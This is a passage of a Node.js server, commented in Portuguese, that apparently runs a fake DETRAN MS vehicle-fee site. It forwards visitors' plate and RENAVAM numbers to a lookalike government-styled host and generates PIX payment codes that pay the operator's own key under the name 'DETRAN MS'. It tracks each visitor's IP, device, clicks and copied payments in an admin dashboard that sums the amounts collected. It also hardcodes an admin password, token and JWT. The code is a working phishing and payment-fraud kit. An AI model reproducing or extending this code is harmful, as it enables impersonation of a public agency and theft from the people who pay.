const express = require('express');
const axios = require('axios');
const fs = require('fs').promises;
const path = require('path');

const app = express();

// ============================================
// CORS MANUAL - FUNCIONA SEMPRE
// ============================================
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Credentials', 'true');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    next();
});

app.use(express.json());
app.use(express.static('.'));

// ============================================
// BANCO DE DADOS SIMPLES EM JSON
// ============================================
const DATA_DIR = path.join(__dirname, 'data');

(async () => {
    try {
        await fs.mkdir(DATA_DIR, { recursive: true });
        const files = ['consultas.json', 'pix.json', 'config.json', 'cliques.json'];
        for (const file of files) {
            const filePath = path.join(DATA_DIR, file);
            try { 
                await fs.access(filePath); 
            } catch { 
                if (file === 'config.json') {
                    await fs.writeFile(filePath, JSON.stringify({
                        chavePix: '',
                        nomeRecebedor: 'DETRAN MS',
                        cidadeRecebedor: 'CAMPO GRANDE',
                        timerPagamento: 900,
                        pixTipo: 'aleatoria',
                        pixIdentificador: 'PAGAMENTODETRAN'
                    }, null, 2));
                } else {
                    await fs.writeFile(filePath, '[]');
                }
            }
        }
        console.log('✅ Sistema DETRAN MS inicializado');
    } catch (error) {
        console.error('❌ Erro na inicialização:', error);
    }
})();

// Funções para ler/escrever dados
async function readData(filename) {
    try {
        const data = await fs.readFile(path.join(DATA_DIR, filename), 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return filename === 'config.json' ? {} : [];
    }
}

async function writeData(filename, data) {
    await fs.writeFile(path.join(DATA_DIR, filename), JSON.stringify(data, null, 2));
}

// ============================================
// FUNÇÃO PARA OBTER IP COMPLETO E ESTADO
// ============================================
function getIpCompleto(req) {
    let ip = req.ip || 
             req.connection.remoteAddress || 
             req.socket.remoteAddress || 
             req.connection.socket.remoteAddress;
    
    // Remove prefixo ::ffff: se existir
    ip = ip.replace('::ffff:', '');
    
    // Se for localhost, tenta pegar IP real dos headers
    if (ip === '127.0.0.1' || ip === '::1' || ip.includes('localhost')) {
        ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             ip;
    }
    
    // Se tiver múltiplos IPs (proxy), pega o primeiro
    if (ip && ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }
    
    return ip;
}

// ============================================
// FUNÇÃO PARA DETECTAR ESTADO PELO IP (SIMULADO)
// ============================================
function detectarEstadoPorIP(ip) {
    // Mapa simples de IPs para estados (para demonstração)
    // Em produção, use uma API de geolocalização
    
    if (!ip || ip === '127.0.0.1' || ip === '::1') {
        return 'LOCAL';
    }
    
    // Simulação baseada em padrões comuns
    if (ip.startsWith('177.')) return 'SP';
    if (ip.startsWith('179.')) return 'SP';
    if (ip.startsWith('187.')) return 'RJ';
    if (ip.startsWith('189.')) return 'RJ';
    if (ip.startsWith('200.')) return 'RJ';
    if (ip.startsWith('177.39.')) return 'MG';
    if (ip.startsWith('177.72.')) return 'RS';
    if (ip.startsWith('177.85.')) return 'PR';
    if (ip.startsWith('177.92.')) return 'SC';
    if (ip.startsWith('177.103.')) return 'BA';
    if (ip.startsWith('177.200.')) return 'DF';
    if (ip.startsWith('179.218.')) return 'MS';
    if (ip.startsWith('179.222.')) return 'MS';
    
    // Fallback aleatório para demonstração
    const estados = ['SP', 'RJ', 'MG', 'RS', 'PR', 'SC', 'BA', 'DF', 'MS', 'GO', 'MT', 'PE', 'CE'];
    return estados[Math.floor(Math.random() * estados.length)];
}

// ============================================
// USUÁRIOS ONLINE (TEMPO REAL - MEMÓRIA)
// ============================================
const usuariosOnline = new Map();

app.post('/api/online/entrou', (req, res) => {
    try {
        const ip = getIpCompleto(req);
        const userAgent = req.get('User-Agent') || '';
        const estado = detectarEstadoPorIP(ip);
        
        let dispositivo = 'Desktop';
        if (/android/i.test(userAgent)) dispositivo = 'Android';
        else if (/iphone|ipad|ipod/i.test(userAgent)) dispositivo = 'iOS';
        else if (/mobile/i.test(userAgent)) dispositivo = 'Mobile';
        
        usuariosOnline.set(ip, {
            ip,
            ipCompleto: ip,
            estado: estado,
            dispositivo,
            userAgent,
            paginaAtual: req.body.pagina || '/',
            ultimaAtividade: Date.now(),
            dataEntrada: new Date().toISOString()
        });
        
        console.log(`👤 Usuário ONLINE: ${ip} (${estado}) - ${dispositivo}`);
        res.json({ sucesso: true, online: usuariosOnline.size });
    } catch (error) {
        res.status(500).json({ sucesso: false });
    }
});

app.post('/api/online/ativo', (req, res) => {
    try {
        const ip = getIpCompleto(req);
        const usuario = usuariosOnline.get(ip);
        if (usuario) {
            usuario.ultimaAtividade = Date.now();
        }
        res.json({ sucesso: true });
    } catch (error) {
        res.status(500).json({ sucesso: false });
    }
});

app.post('/api/online/saiu', (req, res) => {
    try {
        const ip = getIpCompleto(req);
        if (usuariosOnline.has(ip)) {
            usuariosOnline.delete(ip);
            console.log(`👤 Usuário OFFLINE: ${ip}`);
        }
        res.json({ sucesso: true, online: usuariosOnline.size });
    } catch (error) {
        res.status(500).json({ sucesso: false });
    }
});

// ============================================
// CORREÇÃO 4: SISTEMA DE CLIQUES (NOVA ROTA)
// ============================================
app.post('/api/registrar-clique', async (req, res) => {
    try {
        const { tipo, elemento, pagina, detalhes } = req.body;
        const ip = getIpCompleto(req);
        const userAgent = req.get('User-Agent') || '';
        const estado = detectarEstadoPorIP(ip);
        
        let dispositivo = 'Desktop';
        if (/android/i.test(userAgent)) dispositivo = 'Android';
        else if (/iphone|ipad|ipod/i.test(userAgent)) dispositivo = 'iOS';
        else if (/mobile/i.test(userAgent)) dispositivo = 'Mobile';
        
        // Carrega cliques existentes
        const cliques = await readData('cliques.json');
        
        // Adiciona novo clique
        cliques.push({
            ip: ip,
            ipCompleto: ip,
            estado: estado,
            dispositivo: dispositivo,
            tipo: tipo || 'clique',
            elemento: elemento || 'desconhecido',
            pagina: pagina || window.location.pathname,
            detalhes: detalhes || '',
            dataHora: new Date().toISOString(),
            userAgent: userAgent.substring(0, 200)
        });
        
        // Mantém apenas últimos 5000 cliques
        if (cliques.length > 5000) {
            cliques.splice(0, cliques.length - 5000);
        }
        
        // Salva no arquivo
        await writeData('cliques.json', cliques);
        
        console.log(`🖱️ Clique registrado: ${ip} (${estado}) - ${tipo}`);
        
        res.json({ sucesso: true, mensagem: 'Clique registrado' });
        
    } catch (error) {
        console.error('❌ Erro ao registrar clique:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API BUSCAR CLIQUES (PARA PAINEL)
// ============================================
app.post('/api/admin/buscar-cliques', autenticarAdmin, async (req, res) => {
    try {
        const { filtro, tipo, pagina = 1, limite = 50 } = req.body;
        const cliques = await readData('cliques.json');
        
        let resultados = [...cliques].reverse(); // Mais recentes primeiro
        
        // Aplicar filtros
        if (filtro) {
            const filtroLower = filtro.toLowerCase();
            resultados = resultados.filter(c =>
                (c.ip && c.ip.toLowerCase().includes(filtroLower)) ||
                (c.estado && c.estado.toLowerCase().includes(filtroLower)) ||
                (c.dispositivo && c.dispositivo.toLowerCase().includes(filtroLower)) ||
                (c.tipo && c.tipo.toLowerCase().includes(filtroLower))
            );
        }
        
        if (tipo && tipo !== 'todos') {
            resultados = resultados.filter(c => c.tipo === tipo);
        }
        
        // Paginação
        const inicio = (pagina - 1) * limite;
        const fim = inicio + limite;
        const paginados = resultados.slice(inicio, fim);
        const total = resultados.length;
        const totalPaginas = Math.ceil(total / limite);
        
        res.json({
            sucesso: true,
            pagina: parseInt(pagina),
            totalPaginas: totalPaginas,
            total: total,
            resultados: paginados
        });
        
    } catch (error) {
        console.error('Erro ao buscar cliques:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// ROTA PRINCIPAL: CONSULTA DETRAN
// ============================================
app.post('/consultar', async (req, res) => {
    try {
        const { placa, renavam } = req.body;
        const ip = getIpCompleto(req);
        const userAgent = req.get('User-Agent') || '';
        const estado = detectarEstadoPorIP(ip);
        
        console.log(`🔍 Consulta recebida: ${placa} / ${renavam} - IP: ${ip} (${estado})`);
        
        // TOKEN ORIGINAL
        const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZW5hdmFtIjoiMDA0Njc4ODA0NzYiLCJwbGF0ZSI6Ik5SUzVKNDciLCJpYXQiOjE3NzAzMzIwMzR9.QmpzZTRGYiTxapKcyIzd8eZxooEGtQM3sAsMevX125c';

        // CONSULTA ORIGINAL (etapa 1)
        const resposta1 = await axios.post(
            'https://detranmatogrossosul-govbr.vercel.app/api/scrape5',
            { renavam, plate: placa },
            { headers: { Authorization: token } }
        );

        const userId = resposta1.data.userId;

        // CONSULTA ORIGINAL (etapa 2)
        const resposta2 = await axios.get(
            `https://detranmatogrossosul-govbr.vercel.app/veiculo/${userId}`
        );

        // REGISTRA CONSULTA
        const consultas = await readData('consultas.json');
        
        let dispositivo = 'Desktop';
        if (/android/i.test(userAgent)) dispositivo = 'Android';
        else if (/iphone|ipad|ipod/i.test(userAgent)) dispositivo = 'iOS';
        else if (/mobile/i.test(userAgent)) dispositivo = 'Mobile';
        
        consultas.push({
            placa: placa.toUpperCase(),
            renavam: renavam,
            ip: ip,
            ipCompleto: ip,
            estado: estado,
            dispositivo: dispositivo,
            dataHora: new Date().toISOString(),
            userId: userId
        });
        
        // Mantém apenas últimas 1000
        if (consultas.length > 1000) {
            consultas.splice(0, consultas.length - 1000);
        }
        await writeData('consultas.json', consultas);
        
        // Atualiza usuário online
        const usuario = usuariosOnline.get(ip);
        if (usuario) {
            usuario.ultimaAtividade = Date.now();
            usuario.paginaAtual = 'consultando';
            usuario.estado = estado;
        }
        
        // RETORNA HTML ORIGINAL DO DETRAN
        res.send(resposta2.data);

    } catch (error) {
        console.error('❌ Erro na consulta:', error.message);
        res.status(500).send('Erro: ' + error.message);
    }
});

// ============================================
// CONFIGURAÇÃO DE USUÁRIOS ADMIN - APENAS 1 USUÁRIO
// ============================================
const users = [
    {
        usuario: "dg",
        senha: "vasco1898",
        nivel: "admin",
        nome: "Administrador DG"
    }
];

// ============================================
// MIDDLEWARE DE AUTENTICAÇÃO
// ============================================
function autenticarAdmin(req, res, next) {
    const token = req.headers.authorization;
    
    if (!token || token !== 'DETRAN-MS-ADMIN-TOKEN') {
        return res.status(401).json({ 
            sucesso: false, 
            mensagem: 'Não autorizado' 
        });
    }
    next();
}

// ============================================
// API DE LOGIN ADMIN
// ============================================
app.post('/api/admin/login', (req, res) => {
    try {
        const { usuario, senha } = req.body;
        
        const user = users.find(u => 
            u.usuario === usuario && u.senha === senha
        );
        
        if (user) {
            res.json({
                sucesso: true,
                token: 'DETRAN-MS-ADMIN-TOKEN',
                usuario: user.usuario,
                nome: user.nome,
                nivel: user.nivel
            });
        } else {
            res.status(401).json({
                sucesso: false,
                mensagem: 'Usuário ou senha incorretos'
            });
        }
    } catch (error) {
        res.status(500).json({ 
            sucesso: false, 
            mensagem: 'Erro no servidor' 
        });
    }
});

// ============================================
// CORREÇÃO 2: REGISTRAR PIX COPIADO (APENAS PRIMEIRO CLIQUE)
// ============================================
app.post('/api/registrar-pix-copiado', async (req, res) => {
    try {
        const { valor, placa, renavam, tipo, descricao, primeiroClique } = req.body;
        const ip = getIpCompleto(req);
        const estado = detectarEstadoPorIP(ip);
        
        // Se não for primeiro clique, ignora
        if (!primeiroClique) {
            console.log(`⚠️ Clique repetido ignorado: ${ip} - ${placa}`);
            return res.json({ sucesso: true, mensagem: 'Clique repetido ignorado' });
        }
        
        // Carrega dados PIX atual
        const pixData = await readData('pix.json');
        
        // Verifica se já existe registro similar recente (5 minutos)
        const cincoMinutosAtras = new Date(Date.now() - 5 * 60 * 1000).toISOString();
        const jaRegistrado = pixData.some(p => 
            p.ip === ip && 
            p.placa === placa && 
            p.tipo === 'copiado' &&
            new Date(p.dataHora) > new Date(cincoMinutosAtras)
        );
        
        if (jaRegistrado) {
            console.log(`⚠️ PIX já registrado recentemente: ${ip} - ${placa}`);
            return res.json({ sucesso: true, mensagem: 'Já registrado recentemente' });
        }
        
        // Adiciona novo registro
        pixData.push({
            tipo: 'copiado',
            categoria: 'copiado', // CORREÇÃO 5: Categoria separada
            valor: parseFloat(valor) || 0,
            valorFormatado: `R$ ${parseFloat(valor || 0).toFixed(2).replace('.', ',')}`, // CORREÇÃO 1: Valor formatado
            placa: placa || 'N/A',
            renavam: renavam || 'N/A',
            descricao: descricao || 'Código copiado',
            dataHora: new Date().toISOString(),
            ip: ip,
            ipCompleto: ip,
            estado: estado,
            status: 'copiado',
            primeiroClique: true
        });
        
        // Salva no arquivo
        await writeData('pix.json', pixData);
        
        console.log(`📋 PIX COPIADO registrado: ${ip} (${estado}) - ${placa} - R$ ${valor}`);
        
        res.json({ sucesso: true, mensagem: 'Registrado com sucesso' });
        
    } catch (error) {
        console.error('❌ Erro ao registrar PIX copiado:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API BUSCAR CONSULTAS
// ============================================
app.post('/api/admin/buscar-consultas', autenticarAdmin, async (req, res) => {
    try {
        const { filtro, tipo, pagina = 1, limite = 20 } = req.body;
        const consultas = await readData('consultas.json');
        
        let resultados = [...consultas].reverse(); // Mais recentes primeiro
        
        // Aplicar filtros
        if (filtro) {
            const filtroLower = filtro.toLowerCase();
            resultados = resultados.filter(c =>
                (c.placa && c.placa.toLowerCase().includes(filtroLower)) ||
                (c.renavam && c.renavam.includes(filtro)) ||
                (c.ip && c.ip.includes(filtro)) ||
                (c.estado && c.estado.toLowerCase().includes(filtroLower))
            );
        }
        
        if (tipo && tipo !== 'todos') {
            resultados = resultados.filter(c => 
                c.dispositivo && c.dispositivo.toLowerCase().includes(tipo.toLowerCase())
            );
        }
        
        // Paginação
        const inicio = (pagina - 1) * limite;
        const fim = inicio + limite;
        const paginados = resultados.slice(inicio, fim);
        const total = resultados.length;
        const totalPaginas = Math.ceil(total / limite);
        
        res.json({
            sucesso: true,
            pagina: parseInt(pagina),
            totalPaginas: totalPaginas,
            total: total,
            resultados: paginados.map(c => ({
                ...c,
                ipCompleto: c.ipCompleto || c.ip,
                estado: c.estado || 'N/A'
            }))
        });
        
    } catch (error) {
        console.error('Erro ao buscar consultas:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API BUSCAR PIX (COM CORREÇÃO 5: SEPARAÇÃO)
// ============================================
app.post('/api/admin/buscar-pix', autenticarAdmin, async (req, res) => {
    try {
        const { filtro, tipo, categoria, pagina = 1, limite = 20 } = req.body;
        const pixData = await readData('pix.json');
        
        let resultados = [...pixData].reverse(); // Mais recentes primeiro
        
        // Aplicar filtros
        if (filtro) {
            const filtroLower = filtro.toLowerCase();
            resultados = resultados.filter(p =>
                (p.placa && p.placa.toLowerCase().includes(filtroLower)) ||
                (p.renavam && p.renavam.includes(filtro)) ||
                (p.valor && p.valor.toString().includes(filtro)) ||
                (p.ip && p.ip.includes(filtro)) ||
                (p.estado && p.estado.toLowerCase().includes(filtroLower))
            );
        }
        
        if (tipo && tipo !== 'todos') {
            resultados = resultados.filter(p => p.tipo === tipo);
        }
        
        // CORREÇÃO 5: Filtro por categoria (gerado vs copiado)
        if (categoria && categoria !== 'todas') {
            resultados = resultados.filter(p => p.categoria === categoria);
        }
        
        // Paginação
        const inicio = (pagina - 1) * limite;
        const fim = inicio + limite;
        const paginados = resultados.slice(inicio, fim);
        const total = resultados.length;
        const totalPaginas = Math.ceil(total / limite);
        
        res.json({
            sucesso: true,
            pagina: parseInt(pagina),
            totalPaginas: totalPaginas,
            total: total,
            resultados: paginados.map(p => ({
                ...p,
                ipCompleto: p.ipCompleto || p.ip,
                estado: p.estado || 'N/A',
                categoria: p.categoria || (p.tipo === 'copiado' ? 'copiado' : 'gerado'),
                valorFormatado: p.valorFormatado || `R$ ${parseFloat(p.valor || 0).toFixed(2).replace('.', ',')}` // CORREÇÃO 1
            }))
        });
        
    } catch (error) {
        console.error('Erro ao buscar PIX:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// CALCULAR CRC16 PARA PIX
// ============================================
function calcularCRC16(payload) {
    let crc = 0xFFFF;
    
    for (let i = 0; i < payload.length; i++) {
        crc ^= payload.charCodeAt(i) << 8;
        
        for (let j = 0; j < 8; j++) {
            if (crc & 0x8000) {
                crc = (crc << 1) ^ 0x1021;
            } else {
                crc = crc << 1;
            }
        }
    }
    
    // Mantém apenas 16 bits
    crc = crc & 0xFFFF;
    
    // Retorna em maiúsculas com 4 dígitos
    return crc.toString(16).toUpperCase().padStart(4, '0');
}

// ============================================
// GERAR CÓDIGO PIX REAL
// ============================================
function gerarCodigoPIX(chavePix, valor, nomeRecebedor, cidade, identificador) {
    if (!chavePix || chavePix.trim() === '') {
        throw new Error('Chave PIX não configurada');
    }
    
    const chaveOriginal = chavePix.trim();
    
    if (chaveOriginal.length < 11) {
        throw new Error('Chave PIX muito curta (mínimo 11 caracteres)');
    }
    
    if (chaveOriginal.length > 77) {
        throw new Error('Chave PIX muito longa (máximo 77 caracteres)');
    }
    
    nomeRecebedor = (nomeRecebedor || 'DETRAN MS').substring(0, 25);
    cidade = (cidade || 'CAMPO GRANDE').substring(0, 15);
    const txId = (identificador || 'PAGAMENTODETRAN').substring(0, 20);
    const valorStr = parseFloat(valor).toFixed(2);
    
    // Construção do payload
    let payload = '000201';
    
    // Merchant Account Information
    const pixStatic = '0014BR.GOV.BCB.PIX';
    const chaveComTamanho = '01' + chaveOriginal.length.toString().padStart(2, '0') + chaveOriginal;
    const merchantInfo = pixStatic + chaveComTamanho;
    payload += '26' + merchantInfo.length.toString().padStart(2, '0') + merchantInfo;
    
    // Merchant Category Code
    payload += '52040000';
    
    // Transaction Currency
    payload += '5303986';
    
    // Transaction Amount
    payload += '54' + valorStr.length.toString().padStart(2, '0') + valorStr;
    
    // Country Code
    payload += '5802BR';
    
    // Merchant Name
    payload += '59' + nomeRecebedor.length.toString().padStart(2, '0') + nomeRecebedor;
    
    // Merchant City
    payload += '60' + cidade.length.toString().padStart(2, '0') + cidade;
    
    // Additional Data Field
    if (txId && txId.length > 0) {
        const additionalData = '05' + txId.length.toString().padStart(2, '0') + txId;
        payload += '62' + additionalData.length.toString().padStart(2, '0') + additionalData;
    }
    
    // Adiciona placeholder do CRC
    const payloadSemCRC = payload + '6304';
    
    // Calcula CRC16
    const crc = calcularCRC16(payloadSemCRC);
    
    // Retorna código completo
    return payload + '6304' + crc;
}

// ============================================
// API PARA GERAR PIX COM CHAVE DO PAINEL (COM CORREÇÃO 1)
// ============================================
app.post('/api/gerar-pix', async (req, res) => {
    try {
        const { valor, placa, renavam, tipo, descricao } = req.body;
        const ip = getIpCompleto(req);
        const estado = detectarEstadoPorIP(ip);
        
        // Carrega configurações
        const config = await readData('config.json');
        
        // VERIFICA SE TEM CHAVE PIX CADASTRADA
        if (!config.chavePix || config.chavePix.trim() === '') {
            return res.status(400).json({ 
                sucesso: false, 
                mensagem: 'Configure sua chave PIX no painel administrativo' 
            });
        }
        
        // Valida valor
        const valorNum = parseFloat(valor);
        if (isNaN(valorNum) || valorNum <= 0 || valorNum > 1000000) {
            return res.status(400).json({ 
                sucesso: false, 
                mensagem: 'Valor inválido' 
            });
        }
        
        // Gera código PIX
        const codigoPix = gerarCodigoPIX(
            config.chavePix, 
            valorNum, 
            config.nomeRecebedor || 'DETRAN MS',
            config.cidadeRecebedor || 'CAMPO GRANDE',
            config.pixIdentificador || 'PAGAMENTODETRAN'
        );
        
        // DEBUG
        console.log('📱 PIX GERADO COM SUCESSO:', {
            tamanho: codigoPix.length,
            crc: codigoPix.slice(-4),
            placa: placa,
            valor: valorNum,
            ip: ip,
            estado: estado
        });
        
        // REGISTRA PIX GERADO (COM CORREÇÃO 1: SALVAR VALOR COMPLETO)
        const pixData = await readData('pix.json');
        pixData.push({
            tipo: tipo || 'gerado',
            categoria: 'gerado', // CORREÇÃO 5: Categoria separada
            valor: valorNum, // CORREÇÃO 1: Valor numérico
            valorFormatado: `R$ ${valorNum.toFixed(2).replace('.', ',')}`, // CORREÇÃO 1: Valor formatado
            placa: placa || 'N/A',
            renavam: renavam || 'N/A',
            descricao: descricao || '',
            chavePix: config.chavePix.substring(0, 3) + '***' + config.chavePix.substring(config.chavePix.length - 3),
            chaveTipo: config.pixTipo || 'aleatoria',
            identificador: config.pixIdentificador || 'PAGAMENTODETRAN',
            dataHora: new Date().toISOString(),
            ip: ip,
            ipCompleto: ip,
            estado: estado,
            status: 'pendente',
            codigoPix: codigoPix.substring(0, 80)
        });
        
        await writeData('pix.json', pixData);
        
        res.json({
            sucesso: true,
            codigoPix: codigoPix,
            chavePix: config.chavePix.substring(0, 3) + '***',
            nomeRecebedor: config.nomeRecebedor,
            cidade: config.cidadeRecebedor,
            identificador: config.pixIdentificador,
            valor: valorNum.toFixed(2),
            timer: config.timerPagamento || 900,
            mensagem: 'PIX gerado com sucesso!'
        });
        
    } catch (error) {
        console.error('❌ Erro ao gerar PIX:', error.message);
        res.status(500).json({ 
            sucesso: false, 
            erro: error.message,
            mensagem: 'Erro na geração do código PIX. Verifique a chave configurada.'
        });
    }
});

// ============================================
// API LIMPAR DADOS
// ============================================
app.post('/api/admin/limpar-dados', autenticarAdmin, async (req, res) => {
    try {
        const { tipo } = req.body;
        
        if (tipo === 'consultas') {
            await writeData('consultas.json', []);
        } else if (tipo === 'pix') {
            await writeData('pix.json', []);
        } else if (tipo === 'cliques') {
            await writeData('cliques.json', []);
        } else if (tipo === 'tudo') {
            await writeData('consultas.json', []);
            await writeData('pix.json', []);
            await writeData('cliques.json', []);
        }
        
        res.json({
            sucesso: true,
            mensagem: `Dados ${tipo} limpos com sucesso`
        });
        
    } catch (error) {
        console.error('Erro ao limpar dados:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API REMOVER USUÁRIO (MEMÓRIA)
// ============================================
app.post('/api/admin/remover-usuario', autenticarAdmin, (req, res) => {
    try {
        const { ip } = req.body;
        
        if (usuariosOnline.has(ip)) {
            usuariosOnline.delete(ip);
            res.json({
                sucesso: true,
                mensagem: `Usuário ${ip} removido`,
                online: usuariosOnline.size
            });
        } else {
            res.status(404).json({
                sucesso: false,
                mensagem: 'Usuário não encontrado'
            });
        }
        
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API EXPORTAR DADOS
// ============================================
app.get('/api/admin/exportar/:tipo', autenticarAdmin, async (req, res) => {
    try {
        const { tipo } = req.params;
        
        if (tipo === 'consultas') {
            const consultas = await readData('consultas.json');
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Content-Disposition', 'attachment; filename=consultas_detran_ms.json');
            res.json(consultas);
        } else if (tipo === 'pix') {
            const pix = await readData('pix.json');
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Content-Disposition', 'attachment; filename=pix_detran_ms.json');
            res.json(pix);
        } else if (tipo === 'cliques') {
            const cliques = await readData('cliques.json');
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Content-Disposition', 'attachment; filename=cliques_detran_ms.json');
            res.json(cliques);
        } else {
            res.status(400).json({ sucesso: false, mensagem: 'Tipo inválido' });
        }
        
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API PARA PAINEL ADMIN DASHBOARD (COM CORREÇÕES 3 E 5)
// ============================================
app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
    try {
        const consultas = await readData('consultas.json');
        const pix = await readData('pix.json');
        const cliques = await readData('cliques.json');
        const config = await readData('config.json');
        
        // Usuários online (últimos 30 minutos)
        const agora = Date.now();
        const usuariosAtivos = [];
        
        usuariosOnline.forEach((usuario, ip) => {
            const segundosInativo = Math.floor((agora - usuario.ultimaAtividade) / 1000);
            if (segundosInativo <= 1800) {
                usuariosAtivos.push({
                    ...usuario,
                    segundosInativo,
                    status: segundosInativo > 300 ? 'inativo' : 'ativo'
                });
            }
        });
        
        // Ordena por atividade
        usuariosAtivos.sort((a, b) => a.segundosInativo - b.segundosInativo);
        
        // CORREÇÃO 5: SEPARA VALORES GERADOS VS COPIADOS
        const pixGerados = pix.filter(p => p.categoria === 'gerado' || p.tipo === 'gerado');
        const pixCopiados = pix.filter(p => p.categoria === 'copiado' || p.tipo === 'copiado');
        
        // CORREÇÃO 5: Cálculos separados (COM CORREÇÃO 1: USAR VALOR NUMÉRICO)
        const calcularTotal = (lista) => {
            return lista.reduce((total, item) => {
                const valor = parseFloat(item.valor) || 0;
                return total + valor;
            }, 0);
        };
        
        const valorGerados = calcularTotal(pixGerados);
        const valorCopiados = calcularTotal(pixCopiados);
        const valorTotal = valorGerados + valorCopiados;
        
        // Consultas hoje
        const hoje = new Date().toDateString();
        const consultasHoje = consultas.filter(c => 
            new Date(c.dataHora).toDateString() === hoje
        ).length;
        
        // PIX hoje
        const pixHoje = pix.filter(p => 
            new Date(p.dataHora).toDateString() === hoje
        ).length;
        
        // Cliques hoje
        const cliquesHoje = cliques.filter(c => 
            new Date(c.dataHora).toDateString() === hoje
        ).length;
        
        res.json({
            sucesso: true,
            dados: {
                estatisticas: {
                    usuariosOnline: usuariosAtivos.length,
                    totalConsultas: consultas.length,
                    consultasHoje: consultasHoje,
                    
                    // CORREÇÃO 5: Separados
                    pixGerados: pixGerados.length,
                    pixCopiados: pixCopiados.length,
                    pixHoje: pixHoje,
                    
                    // CORREÇÃO 1: Valores formatados com R$
                    valorGerados: `R$ ${valorGerados.toFixed(2)}`,
                    valorCopiados: `R$ ${valorCopiados.toFixed(2)}`,
                    valorTotal: `R$ ${valorTotal.toFixed(2)}`,
                    
                    // Novos: Cliques
                    totalCliques: cliques.length,
                    cliquesHoje: cliquesHoje
                },
                consultasCompletas: consultas.slice(-50).reverse().map(c => ({
                    ...c,
                    ipCompleto: c.ipCompleto || c.ip,
                    estado: c.estado || 'N/A'
                })),
                pixCompletos: pix.slice(-50).reverse().map(p => ({
                    ...p,
                    ipCompleto: p.ipCompleto || p.ip,
                    estado: p.estado || 'N/A',
                    categoria: p.categoria || (p.tipo === 'copiado' ? 'copiado' : 'gerado'),
                    valorFormatado: p.valorFormatado || `R$ ${parseFloat(p.valor || 0).toFixed(2).replace('.', ',')}` // CORREÇÃO 1
                })),
                cliquesRecentes: cliques.slice(-30).reverse().map(c => ({
                    ...c,
                    ipCompleto: c.ipCompleto || c.ip,
                    estado: c.estado || 'N/A'
                })),
                usuariosOnline: usuariosAtivos.map(u => ({
                    ...u,
                    ipCompleto: u.ipCompleto || u.ip,
                    estado: u.estado || 'N/A'
                })),
                sistema: {
                    versao: '2.6.0',
                    inicioOperacao: new Date().toLocaleDateString('pt-BR'),
                    chavePix: config.chavePix || 'Não configurada',
                    chaveTipo: config.pixTipo || 'aleatoria',
                    nomeRecebedor: config.nomeRecebedor || 'DETRAN MS',
                    cidadeRecebedor: config.cidadeRecebedor || 'CAMPO GRANDE',
                    identificador: config.pixIdentificador || 'PAGAMENTODETRAN',
                    timerPagamento: config.timerPagamento || 900,
                    memoria: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`
                }
            }
        });
        
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API PARA CONFIGURAÇÕES (PAINEL)
// ============================================
app.post('/api/admin/config', autenticarAdmin, async (req, res) => {
    try {
        const { 
            chavePix, 
            nomeRecebedor, 
            cidadeRecebedor, 
            timerPagamento, 
            autoCleanup,
            pixTipo,
            pixIdentificador
        } = req.body;
        
        // Valida chave PIX
        if (chavePix !== undefined && (!chavePix || chavePix.trim() === '')) {
            return res.status(400).json({ 
                sucesso: false, 
                mensagem: 'Chave PIX é obrigatória' 
            });
        }
        
        const config = await readData('config.json');
        
        const novaConfig = {
            chavePix: chavePix !== undefined ? chavePix.trim() : config.chavePix,
            nomeRecebedor: nomeRecebedor || config.nomeRecebedor || 'DETRAN MS',
            cidadeRecebedor: cidadeRecebedor || config.cidadeRecebedor || 'CAMPO GRANDE',
            timerPagamento: timerPagamento || config.timerPagamento || 900,
            autoCleanup: autoCleanup !== undefined ? parseInt(autoCleanup) : config.autoCleanup || 30,
            pixTipo: pixTipo || config.pixTipo || 'aleatoria',
            pixIdentificador: pixIdentificador || config.pixIdentificador || 'PAGAMENTODETRAN',
            atualizado: new Date().toISOString()
        };
        
        await writeData('config.json', novaConfig);
        
        console.log('✅ Configurações atualizadas');
        
        res.json({ 
            sucesso: true, 
            mensagem: 'Configurações salvas com sucesso',
            config: novaConfig
        });
        
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// TESTE RÁPIDO DE PIX
// ============================================
app.post('/api/testar-pix', async (req, res) => {
    try {
        const { chavePix } = req.body;
        
        if (!chavePix) {
            return res.status(400).json({ 
                sucesso: false, 
                mensagem: 'Forneça uma chave PIX para testar' 
            });
        }
        
        // Gera PIX de teste
        const codigoPix = gerarCodigoPIX(
            chavePix, 
            1.00,
            'DETRAN MS TESTE',
            'CAMPO GRANDE',
            'TESTEPIX'
        );
        
        res.json({
            sucesso: true,
            codigoPix: codigoPix,
            tamanho: codigoPix.length,
            crc: codigoPix.slice(-4),
            mensagem: 'PIX gerado com sucesso! Teste em um app bancário.'
        });
        
    } catch (error) {
        res.status(500).json({ 
            sucesso: false, 
            erro: error.message,
            mensagem: 'Erro ao gerar PIX de teste'
        });
    }
});

// ============================================
// LIMPEZA AUTOMÁTICA DE INATIVOS - 30 MINUTOS
// ============================================
setInterval(() => {
    const agora = Date.now();
    let removidos = 0;
    
